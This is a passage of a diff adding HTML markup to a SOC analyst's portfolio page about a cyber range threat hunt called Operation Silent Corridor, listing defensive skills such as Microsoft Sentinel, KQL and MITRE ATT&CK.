+          <div style="font-size:11px;color:var(--green);width:40px;text-align:right">#2</div>
+        </div>
+        <div class="score-line">
+          <div class="score-bar-label">Difficulty</div>
+          <div class="score-bar-track"><div class="score-bar-fill" style="width:90%;animation-delay:0.4s"></div></div>
+          <div style="font-size:11px;color:var(--yellow-dim);width:40px;text-align:right">ADV</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SKILLS DEMONSTRATED -->
+  <div class="section">
+    <div class="section-header">
+      <div class="phase-tag">SKILLS</div>
+      <div class="section-title">Technical Skills Demonstrated</div>
+      <div class="section-line"></div>
+    </div>
+    <div class="findings-grid">
+      <div class="finding-card">
+        <div class="finding-label">Platform</div>
+        <div class="finding-value">Microsoft Sentinel + KQL</div>
+      </div>
+      <div class="finding-card">
+        <div class="finding-label">Methodology</div>
+        <div class="finding-value">Hypothesis-Driven Threat Hunt</div>
+      </div>
+      <div class="finding-card">
+        <div class="finding-label">Pivot Technique</div>
+        <div class="finding-value">DNS → Process → Network → Registry</div>
+      </div>
+      <div class="finding-card">
+        <div class="finding-label">Threat Actor</div>
+        <div class="finding-value">State-Sponsored APT (GREY VEIL)</div>
+      </div>
+      <div class="finding-card">
+        <div class="finding-label">Data Sources</div>
+        <div class="finding-value">Sysmon, FortiGate VPN, MDE</div>
+      </div>
+      <div class="finding-card">
+        <div class="finding-label">Framework</div>
+        <div class="finding-value">MITRE ATT&CK Enterprise</div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<footer>
+  <div class="left">
+    <span>Joshua Fischer</span> // SOC Analyst Portfolio //<br>
+    github.com/Joshua-Jeremy-Fischer
+  </div>
+  <div class="right">
+    OPERATION SILENT CORRIDOR // SOLVED // 2 GLOBAL SOLVES<br>
+    LOGN PACIFIC CYBER RANGE // HUNT 04 // ADV
+  </div>
+</footer>
+
+</body>
+</html>
